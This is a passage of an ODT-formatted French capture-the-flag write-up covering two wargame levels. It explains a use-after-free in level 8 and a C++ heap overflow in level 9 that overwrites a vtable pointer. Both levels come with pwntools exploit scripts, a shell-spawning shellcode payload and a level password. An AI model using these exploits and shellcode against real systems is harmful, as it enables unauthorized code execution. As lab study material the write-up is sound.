          <text:p text:style-name="P39"><text:span text:style-name="T12">Cela va forcer le programme à allouer de la mémoire pour une chaîne de 40 bytes. Puisque </text:span><text:soft-page-break/><text:span text:style-name="T12">nous venons de libérer de la mémoire avec </text:span><text:span text:style-name="T3">free</text:span><text:span text:style-name="T12">, il y a de fortes chances pour que le bloc nouvellement alloué et contenant cette longue chaîne ait une adresse proche de 0x804a9c0.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list7403812875897422323" text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P35">Entrer un dernier input :</text:p>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P46">login</text:p>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list4930790456187823680" text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P40"><text:span text:style-name="T12">Cette commande va indiquer au programme de vérifier l'état de la mémoire à auth + 0x20. Mais puisque </text:span><text:span text:style-name="T3">auth n'a pas été réinitialisé </text:span><text:span text:style-name="T12">après le free, ce pointeur désigne désormais l'espace mémoire appartenant à la chaîne de caractère allouée par service, remplie de 'A', et donc de 0x41.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:list xml:id="list153901718262967852" text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P41"><text:span text:style-name="T12">La commande </text:span><text:span text:style-name="T3">system </text:span><text:span text:style-name="T12">sera exécutée car auth + 0x20 n'est en effet pas égale à 0.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr3" draw:name="images3" text:anchor-type="paragraph" svg:width="12.541cm" svg:height="6.749cm" draw:z-index="2"><draw:image xlink:href="Pictures/20000007000030FE00001A5C9CAFFBFF.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">Remarque : le <text:span text:style-name="T3">malloc </text:span><text:span text:style-name="T12">de service n'a pas réalloué </text:span><text:span text:style-name="T7">exactement </text:span><text:span text:style-name="T12">à la même adresse mémoire que la chaîne </text:span><text:span text:style-name="T3">s </text:span><text:span text:style-name="T12">qui a été free (0x10 bytes plus loin), ce qui n'est pas un problème ici.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">&gt;&gt; </text:span><text:span text:style-name="T16">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P20"><text:span text:style-name="T1">from</text:span> <text:span text:style-name="T9">pwn</text:span> <text:span text:style-name="T1">import</text:span> <text:span text:style-name="T4">*</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><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level8"</text:span><text:span text:style-name="T4">,</text:span> <text:span text:style-name="T4">password=</text:span><text:span text:style-name="T11">"5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9"</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">s.process([</text:span><text:span text:style-name="T11">"/home/user/level8/./level8"</text:span><text:span text:style-name="T4">])</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p.recvline(</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p.sendline(b</text:span><text:span text:style-name="T11">'auth AAAA'</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p.recvline(</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p.sendline(b</text:span><text:span text:style-name="T11">'reset'</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p.recvline(</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p.sendline(b</text:span><text:span text:style-name="T11">'service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p.recvline(</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">p.sendline(b</text:span><text:span text:style-name="T11">'login'</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P10">p.interactive()</text:p>
      <text:p text:style-name="P3">Got flag<text:span text:style-name="T12">.</text:span></text:p>
      <text:list xml:id="list3359273525916263905" text:style-name="L12">
        <text:list-item>
          <text:p text:style-name="P25"><text:soft-page-break/>Level 9</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On reconstruit le code suivant :</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P13">#include &lt;iostream&gt;</text:p>
      <text:p text:style-name="P16">#include &lt;cstring&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">class</text:span> <text:span text:style-name="T9">N</text:span></text:p>
      <text:p text:style-name="P19">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">public:</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">N(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">value)</text:span> <text:span text:style-name="T4">{</text:span> <text:span text:style-name="T1">this</text:span><text:span text:style-name="T4">-&gt;n</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">value;</text:span> <text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">~N()</text:span> <text:span text:style-name="T4">{}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T1">operator</text:span><text:span text:style-name="T4">+(N</text:span> <text:span text:style-name="T1">const</text:span> <text:span text:style-name="T4">&amp;</text:span> <text:span text:style-name="T4">rhs)</text:span> <text:span text:style-name="T4">{</text:span> <text:span text:style-name="T1">return</text:span> <text:span text:style-name="T1">this</text:span><text:span text:style-name="T4">-&gt;n</text:span> <text:span text:style-name="T4">+</text:span> <text:span text:style-name="T4">rhs.n;</text:span> <text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T1">operator</text:span><text:span text:style-name="T4">-(N</text:span> <text:span text:style-name="T1">const</text:span> <text:span text:style-name="T4">&amp;</text:span> <text:span text:style-name="T4">rhs)</text:span> <text:span text:style-name="T4">{</text:span> <text:span text:style-name="T1">return</text:span> <text:span text:style-name="T1">this</text:span><text:span text:style-name="T4">-&gt;n</text:span> <text:span text:style-name="T4">-</text:span> <text:span text:style-name="T4">rhs.n;</text:span> <text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">void</text:span> <text:span text:style-name="T4">setAnnotation(</text:span><text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">*str)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">{</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T1">size_t</text:span> <text:span text:style-name="T4">size</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">strlen(str);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T4">memcpy(</text:span><text:span text:style-name="T1">this</text:span><text:span text:style-name="T4">-&gt;string,</text:span> <text:span text:style-name="T4">str,</text:span> <text:span text:style-name="T4">size);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="12"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">}</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">char</text:span> <text:s text:c="3"/><text:span text:style-name="T4">string[</text:span><text:span text:style-name="T10">0x64</text:span><text:span text:style-name="T4">];<text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T6">// [this + 0x4]</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T4">n;</text:span> <text:s text:c="29"/><text:span text:style-name="T6">// [this + 0x68]</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P19">};</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T8">main</text:span><text:span text:style-name="T4">(</text:span><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T4">argc,</text:span> <text:span text:style-name="T1">char</text:span> <text:span text:style-name="T4">**argv)</text:span></text:p>
      <text:p text:style-name="P19">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T4">(argc</text:span> <text:span text:style-name="T4">&lt;</text:span> <text:span text:style-name="T10">2</text:span><text:span text:style-name="T4">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T4">exit(</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">N</text:span> <text:span text:style-name="T4">*a</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T1">new</text:span> <text:span text:style-name="T4">N(</text:span><text:span text:style-name="T10">5</text:span><text:span text:style-name="T4">);</text:span> <text:s text:c="15"/><text:tab/><text:tab/><text:span text:style-name="T6">// [esp + 0x1c] - 0x804a008</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">N</text:span> <text:span text:style-name="T4">*b</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T1">new</text:span> <text:span text:style-name="T4">N(</text:span><text:span text:style-name="T10">6</text:span><text:span text:style-name="T4">);</text:span> <text:s text:c="15"/><text:tab/><text:tab/><text:span text:style-name="T6">// [esp + 0x18] - 0x804a078</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T4">a-&gt;setAnnotation(argv[</text:span><text:span text:style-name="T10">1</text:span><text:span text:style-name="T4">]);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T4">(b-&gt;</text:span><text:span text:style-name="T1">operator</text:span><text:span text:style-name="T4">+(*a));</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P2">Il s'agit ici donc d'un binaire qui a été rédigé en C++ (on peut le savoir au vu des noms des symboles qui sont un peu étranges avec GCC et commencent par _Z pour les classes, un autre indice est l'utilisation de <text:span text:style-name="T3">ebx </text:span><text:span text:style-name="T12">sans qu'on l'initialise dans des fonctions car représentant le pointeur </text:span><text:span text:style-name="T3">this</text:span><text:span text:style-name="T12">, etc...)</text:span>. La reconstruction du code source à partir du binaire désassemblé était un peu plus complexe que le pur C.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Quelques ressources pour introduire le reverse engineering en C++ :</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf</text:a></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://codeyarns.com/tech/2017-06-13-a-dissection-of-c-virtual-functions.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://codeyarns.com/tech/2017-06-13-a-dissection-of-c-virtual-functions.html</text:a> </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"><text:soft-page-break/>Mais bon, le code décompilé correspondant à un programme C++ va pas mal varier selon les compilateurs.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Quoi qu'il en soit, la fonction <text:span text:style-name="T3">main </text:span>commence par comparer [ebp + 0x8] à 0x1 pour vérifier le nombre d'arguments passés au programme, et quitter si ce nombre est inférieur à 1.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">En effet :</text:p>
      <text:p text:style-name="P2">[ebp]<text:tab/><text:tab/>=<text:tab/>saved EBP.</text:p>
      <text:p text:style-name="P2">[ebp + 0x4]<text:tab/>=<text:tab/>ret address.</text:p>
      <text:p text:style-name="P2">[ebp + 0x8]<text:tab/>=<text:tab/>argc</text:p>
      <text:p text:style-name="P2">[ebp + 0xc]<text:tab/>=<text:tab/>argv[0]</text:p>
      <text:p text:style-name="P2">etc...</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Bref. Ensuite, on tombe sur ce pattern d'instructions :</text:p>
      <text:p text:style-name="P2"><draw:frame draw:style-name="fr1" draw:name="images4" text:anchor-type="paragraph" svg:width="18.999cm" svg:height="3.59cm" draw:z-index="3"><draw:image xlink:href="Pictures/200000070000471C00000D718E4495CF.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">Comment a-t-on su que <text:span text:style-name="T3">_Znwj </text:span><text:span text:style-name="T12">correspondait à l'opérateur </text:span><text:span text:style-name="T3">new</text:span><text:span text:style-name="T12">, et </text:span><text:span text:style-name="T3">_ZN1NC2Ei</text:span><text:span text:style-name="T12"> au constructeur d'une classe ? C'est vrai que ce n'est vraiment pas évident dans gdb, mais </text:span><text:span text:style-name="T3">edb </text:span><text:span text:style-name="T12">nous l'affiche plus clairement (en fait, gdb nous donne l'information relative aux noms de fonction / de constructeurs dans </text:span><text:span text:style-name="T7">info functions</text:span><text:span text:style-name="T12">, mais pas dans le code désassemblé) :</text:span></text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images5" text:anchor-type="paragraph" svg:x="0.058cm" svg:y="0.275cm" svg:width="7.99cm" svg:height="2.701cm" draw:z-index="4"><draw:image xlink:href="Pictures/2000000700001F3700000A8CF49052A6.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Quoi qu'il en soit, la série d'instructions présentée ci-dessus est répétée deux fois, et on comprend donc que deux objets d'une certaine classe (</text:span><text:span text:style-name="T3">N</text:span><text:span text:style-name="T12"> comme affiché dans </text:span><text:span text:style-name="T3">edb</text:span><text:span text:style-name="T12">) sont alloués dynamiquement par l'appel de leur constructeur, avec en paramètre </text:span><text:span text:style-name="T3">5</text:span><text:span text:style-name="T12"> pour le premier, </text:span><text:span text:style-name="T3">6 </text:span><text:span text:style-name="T12">pour le second.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Allons voir ce qu'il se passe dans la fonction correspondant au constructeur de notre classe.</text:p>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images6" text:anchor-type="paragraph" svg:width="19.745cm" svg:height="6.013cm" draw:z-index="5"><draw:image xlink:href="Pictures/2000000700004A0100001689B8FD0953.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/>Deux remarques sur le fonctionnement du constructeur. D'abord, le fait que à l'offset <text:span text:style-name="T3">0 </text:span><text:span text:style-name="T12">de l'espace réservé par l'objet on retrouve sa </text:span><text:span text:style-name="T3">vtable</text:span><text:span text:style-name="T12">, voir l'utilité des </text:span><text:span text:style-name="T3">vtables</text:span><text:span text:style-name="T12"> (voir 2ème réponse) :</text:span></text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/3004501/why-do-we-need-virtual-table" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T12">https://stackoverflow.com/questions/3004501/why-do-we-need-virtual-table</text:span></text:a><text:span text:style-name="T12"> </text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">En réalité, edb et ghydra m'affirment que la vtable commence à 0x8048848 (8 bytes plus haut), mais ces bytes sont pour la plupart des NULLBYTES. Peut-être des questions de padding ou quoi.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Ensuite, on définit une variable de la classe à l'offset 0x68 par rapport au pointeur de l'objet ; cela signifie qu'on a d'autres variables avant.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Quoi qu'il en soit, on se retrouve avec nos deux instances de classe, stockées à <text:span text:style-name="T13">[esp+0x1c]</text:span> et <text:span text:style-name="T13">[esp+0x18]</text:span>. Avant de poursuivre, on tente d'en savoir un peu plus sur la classe à laquelle on a affaire. Un petit <text:span text:style-name="T3">info functions </text:span><text:span text:style-name="T12">sur GDB nous informe des fonctions membres de cette classe :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr2" draw:name="images7" text:anchor-type="paragraph" svg:x="0.176cm" svg:y="0cm" svg:width="8.019cm" svg:height="2.013cm" draw:z-index="6"><draw:image xlink:href="Pictures/2000000700001F52000007DCBA0DA491.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">On retrouve notre constructeur ; on a également une fonction <text:span text:style-name="T3">setAnnotation</text:span><text:span text:style-name="T12">, ainsi que deux opérateurs (addition, soustraction).</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">En allant visiter l'emplacement mémoire de la </text:span><text:span text:style-name="T3">vtable </text:span><text:span text:style-name="T12">de notre classe, on trouve répertoriés les adresses des fonctions correspondant aux deux </text:span><text:span text:style-name="T3">operators</text:span><text:span text:style-name="T12"> (encore avec des noms étranges) :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr3" draw:name="images8" text:anchor-type="paragraph" svg:width="15.266cm" svg:height="1.058cm" draw:z-index="7"><draw:image xlink:href="Pictures/2000000700003BA3000004233957365B.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Les opérateurs sont donc appelés comme des fonctions virtuelles, ce qui n'est pas le cas des fonctions membre statiques comme </text:span><text:span text:style-name="T3">setAnnotation</text:span><text:span text:style-name="T12">. Quoi qu'il en soit, on examine rapidement le contenu de ces nouvelles fonctions ; commençons par l'opérateur </text:span><text:span text:style-name="T3">+</text:span><text:span text:style-name="T12"> :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images9" text:anchor-type="paragraph" svg:width="17.886cm" svg:height="5.126cm" draw:z-index="8"><draw:image xlink:href="Pictures/20000007000046B300001443D6C79D5F.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Relativement simple ici, on récupère la variable </text:span><text:span text:style-name="T3">n </text:span><text:span text:style-name="T12">de chaque instance de N, on additionne, on retourne le résultat.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Pour la fonction </text:span><text:span text:style-name="T3">setAnnotation</text:span><text:span text:style-name="T12">, c'était du pur </text:span><text:span text:style-name="T3">C</text:span><text:span text:style-name="T12">, donc rien de bien nouveau. Revenons au désassemblage de notre fonction </text:span><text:span text:style-name="T3">main</text:span><text:span text:style-name="T12">. Le schéma ci-dessous explique le call à setAnnotation, puis à l'opérateur + :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images10" text:anchor-type="paragraph" svg:width="18.999cm" svg:height="8.451cm" draw:z-index="10"><draw:image xlink:href="Pictures/2000000700004FB00000237471BA68F1.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P2">Maintenant que le code est clair, où se situe la vulnérabilité ? On a un overflow potentiel dans la fonction <text:span text:style-name="T3">setAnnotation </text:span><text:span text:style-name="T12">de la classe N. Le memcpy recopie </text:span><text:span text:style-name="T3">argv[1] </text:span><text:span text:style-name="T12">dans une variable membre qui est un tableau de taille fixe (0x64 bytes).</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2"><text:span text:style-name="T12">Ce qui va être intéressant, c'est que </text:span><text:span text:style-name="T3">sur la heap</text:span><text:span text:style-name="T12">, on a la configuration suivante :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr1" draw:name="images11" text:anchor-type="paragraph" svg:width="19.999cm" svg:height="3.316cm" draw:z-index="9"><draw:image xlink:href="Pictures/2000000700005CD100000F67005BA9BD.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">Et <text:span text:style-name="T3">suite à l'appel de setAnnotation </text:span>(qui contient l'overflow), on utilise le <text:span text:style-name="T15">vtable ptr</text:span><text:span text:style-name="T17"> de l'objet </text:span><text:span text:style-name="T18">b </text:span><text:span text:style-name="T17">afin d'utiliser son </text:span><text:span text:style-name="T18">operator+</text:span><text:span text:style-name="T17">.</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P4"><text:span text:style-name="T17">On peut ici prendre contrôle du flux d'exécution du programme par l'overflow de la </text:span><text:span text:style-name="T18">member variable string </text:span><text:span text:style-name="T17">de l'objet </text:span><text:span text:style-name="T18">a</text:span><text:span text:style-name="T17">. Le contenu de cette variable peut overflow sur l'objet </text:span><text:span text:style-name="T18">b</text:span><text:span text:style-name="T17"> et notamment son </text:span><text:span text:style-name="T18">vtable ptr</text:span><text:span text:style-name="T17">. Le plan est donc :</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P4"><text:span text:style-name="T17">&gt; De trouver l'offset qui overflow </text:span><text:span text:style-name="T18">b vtable ptr</text:span><text:span text:style-name="T17">, dans notre variable argv[1] (copiée dans la member variable </text:span><text:span text:style-name="T18">string</text:span><text:span text:style-name="T17"> de </text:span><text:span text:style-name="T18">a</text:span><text:span text:style-name="T17">).</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T17">&gt; Remplacer l'adresse du </text:span><text:span text:style-name="T18">vtable ptr </text:span><text:span text:style-name="T17">par une adresse contenant un pointeur vers une fonction ou une région mémoire qu'on contrôle (</text:span><text:span text:style-name="T18">attention</text:span><text:span text:style-name="T17">, on ne peut simplement remplacer directement le </text:span><text:span text:style-name="T15">vtable ptr</text:span><text:span text:style-name="T17"> par la fonction ou l'adresse mémoire qu'on souhaite, le main appelle la fonction dont l'adresse est contenue dans </text:span><text:span text:style-name="T15">vtable + 0x0</text:span><text:span text:style-name="T17">).</text:span></text:p>
      <text:p text:style-name="P5">&gt; Récupérer une shell.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P4"><text:span text:style-name="T17">On commence par récupérer l'offset en générant un </text:span><text:span text:style-name="T18">pattern metasploit</text:span><text:span text:style-name="T17"> (on aurait également pu calculer à la main) et en l'insérant dans argv[1]. La fonction </text:span><text:span text:style-name="T18">main</text:span><text:span text:style-name="T17"> va crash à </text:span><text:span text:style-name="T18">+142</text:span><text:span text:style-name="T17"> (elle essaie de déréférencer l'adresse à laquelle est censée se trouver la vtable de b, cependant il ne s'agit pas d'un emplacement mémoire accessible). On observe les registres lors du crash pour savoir quel pattern a remplacer le </text:span><text:span text:style-name="T15">vtable ptr</text:span><text:span text:style-name="T17"> de b, et on en déduit l'offset : </text:span><text:span text:style-name="T18">108</text:span><text:span text:style-name="T17">.</text:span></text:p>
      <text:p text:style-name="P5"><text:soft-page-break/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T17">De là, la question qui se pose est où on va rediriger le flux d'exécution qu'on contrôle. </text:span><text:span text:style-name="T18">NX </text:span><text:span text:style-name="T17">était désactivé, et on voit sur </text:span><text:span text:style-name="T18">edb </text:span><text:span text:style-name="T17">que l'emplacement mémoire de la heap qui contient nos objets est à la fois disponible en écriture et en exécution :</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"><draw:frame draw:style-name="fr1" draw:name="images12" text:anchor-type="paragraph" svg:width="12.658cm" svg:height="7.133cm" draw:z-index="11"><draw:image xlink:href="Pictures/200000070000411E000024B20BD4F334.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">Ainsi :</text:p>
      <text:p text:style-name="P4">&gt; L'objet <text:span text:style-name="T3">b </text:span>se trouve à l'adresse 0x804a078.</text:p>
      <text:p text:style-name="P4">&gt; On écrase son <text:span text:style-name="T15">vtable ptr</text:span><text:span text:style-name="T17"> par l'adresse 0x804a07c (4 bytes suivant le début de </text:span><text:span text:style-name="T18">b</text:span><text:span text:style-name="T17">).</text:span></text:p>
      <text:p text:style-name="P5">&gt; On écrase les 4 bytes suivant par l'adresse 0x804a080.</text:p>
      <text:p text:style-name="P5">&gt; On place notre shellcode ensuite.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"><draw:frame draw:style-name="fr1" draw:name="images13" text:anchor-type="paragraph" svg:width="18.209cm" svg:height="4.673cm" draw:z-index="12"><draw:image xlink:href="Pictures/200000070000420C000010F48848D86E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P4"><text:span text:style-name="T17">Ce qu'il va se passer : le </text:span><text:span text:style-name="T18">call edx</text:span><text:span text:style-name="T17"> va chercher le pointeur de fonction situé à l'adresse mémoire de la </text:span><text:span text:style-name="T15">vtable</text:span><text:span text:style-name="T17">. Pour nous, il s'agira de l'adresse de notre shellcode, qui sera exécuté.</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P4"><text:span text:style-name="T17">&gt;&gt; </text:span><text:span text:style-name="T15">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P9"><text:s/>$ ./level9 $(python -c "print('A' * 108 + '\x7c\xa0\x04\x08' + '\x80\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')") </text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">&gt;&gt; <text:span text:style-name="T15">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P20"><text:span text:style-name="T2">from</text:span><text:span text:style-name="T17"> </text:span><text:span text:style-name="T9">pwn</text:span><text:span text:style-name="T17"> </text:span><text:span text:style-name="T2">import</text:span><text:span text:style-name="T17"> </text:span><text:span text:style-name="T5">*</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:span text:style-name="T4">payload</text:span> <text:span text:style-name="T4">=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">''</text:span></text:p>
      <text:p text:style-name="P17"><text:soft-page-break/><text:span text:style-name="T4">payload</text:span> <text:span text:style-name="T4">+=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'A'</text:span> <text:span text:style-name="T4">*</text:span> <text:span text:style-name="T10">108</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">payload</text:span> <text:span text:style-name="T4">+=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'\x7c\xa0\x04\x08'</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">payload</text:span> <text:span text:style-name="T4">+=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">'\x80\xa0\x04\x08'</text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T4">payload</text:span> <text:span text:style-name="T4">+=</text:span> <text:span text:style-name="T4">b</text:span><text:span text:style-name="T11">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</text:span></text:p>
      <text:p text:style-name="P17"/>
